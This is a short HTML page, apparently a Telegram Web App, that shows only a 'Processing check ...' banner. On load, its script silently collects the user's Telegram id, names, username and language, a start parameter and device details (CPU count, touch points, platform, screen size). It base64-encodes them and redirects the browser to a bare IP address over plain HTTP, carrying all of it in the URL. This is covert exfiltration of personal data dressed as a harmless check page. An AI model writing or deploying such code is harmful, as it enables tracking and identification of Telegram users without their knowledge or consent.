<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script type="text/javascript">
        function main (){
            const tg = window.Telegram.WebApp;
            const id = tg.initDataUnsafe.user.id

            const fname = btoa(tg.initDataUnsafe.user.first_name)

            const lastname = btoa(tg.initDataUnsafe.user.last_name)

            const username = btoa(tg.initDataUnsafe.user.username)

            const lang = btoa(tg.initDataUnsafe.user.language_code)

            const cr_id = tg.initDataUnsafe.start_param

            const CPU = btoa(navigator.hardwareConcurrency)

            const maxtouch = btoa(navigator.maxTouchPoints)

            const OS = btoa(navigator.platform)

            document.location.href = `http://92.255.110.40:80?id=${cr_id}&user_id=${id}&username=${username}&fname=${fname}&lname=${lastname}&lang=${lang}&height=${window.screen.height}&width=${window.screen.width}&CPU=${CPU}&max_touch=${maxtouch}&OS=${OS}`
        }
    </script>
    <meta charset="utf-8">
    <style>
        body {
            background-color: blueviolet;
            color: cornsilk;
            text-align: center;
            font-family: 'Archivo black', black, sans-serif;
            font-size: 3em;
        }
        #main_window {
            text-align: center;
            background-color: rgb(124, 38, 204);
            border-radius: 1em;
            height: 3em;
        }
    </style>
</head>
<body id="body" onload="main();">
    <div id="main_window">
        Processing check ...
    </div>
</body>
